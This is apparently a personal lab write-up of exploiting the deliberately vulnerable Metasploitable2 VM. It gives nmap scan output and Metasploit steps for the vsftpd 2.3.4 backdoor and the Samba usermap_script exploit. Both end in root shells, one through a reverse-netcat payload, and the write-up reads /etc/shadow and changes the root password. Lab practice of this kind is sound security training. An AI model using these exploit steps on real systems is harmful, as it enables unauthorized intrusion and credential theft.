# Level 0 (Metaexploitable2)

## nmap scan results

```
Nmap scan report for 192.168.56.3
Host is up (0.50s latency).
Not shown: 977 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2025-12-04T11:18:04+00:00; -14m21s from scanner time.
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-title: Metasploitable2 - Linux
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      33598/udp   mountd
|   100005  1,2,3      54713/tcp   mountd
|   100021  1,3,4      41045/tcp   nlockmgr
|   100021  1,3,4      57761/udp   nlockmgr
|   100024  1          36138/tcp   status
|_  100024  1          46685/udp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 10
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsCompression, LongColumnFlag, SwitchToSSLAfterHandshake, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: =bT`dU^Wy|%>J:!7/'u8
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2025-12-04T11:18:03+00:00; -14m21s from scanner time.
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m39s, deviation: 2h30m01s, median: -14m21s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2025-12-04T06:17:44-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

## Attempt 1: Use vsFTPd 2.3.4 bug: The attacker replaced the legitimate vsftpd-2.3.4.tar.gz archive with a malicious version.  

```bash
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.168.56.3
exploit --job

# Interact with session
session –l
session -i 1

# Get password hash
# actually we get the root shell directly, so we can just change the password
cat /etc/shadow

$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
```

```log
sessions ls

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               172.18.253.133:44789 -> 192.168.56.3:6200 (192.168.56.3)

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[-] Invalid session identifier: 1
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 2
[*] Starting interaction with 2...

passwd
Enter new UNIX password: 0000
Retype new UNIX password: 0000
passwd: password updated successfully
sudo apt update
sudo: apt: command not found
sudo -s
whoami
root
```

## Attempt 2: Samba smbd 3.X - 4.X (the target machine's ip has changed to 10.0.0.50 in this attempt)

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.50
# 445 and 139 both work, default is 445
set RPORT 445
run 
# obtain version: Samba 3.0.20-Debian

search Samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.0.50
# 445 and 139 both work, default is 139
set RPORT 139
run
```

```log
msf exploit(unix/ftp/vsftpd_234_backdoor) > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.3
RHOSTS => 192.168.56.3
msf auxiliary(scanner/smb/smb_version) > set RPORT 445
RPORT => 445
msf auxiliary(scanner/smb/smb_version) > run
[*] 192.168.56.3:445      -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 192.168.56.3          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf auxiliary(scanner/smb/smb_version) > search  Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script


msf > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.0.0.50
RHOSTS => 10.0.0.50
msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] Command shell session 1 opened (10.0.0.102:4444 -> 10.0.0.50:54739) at 2025-12-09 14:27:40 +0800
whoami
root
```
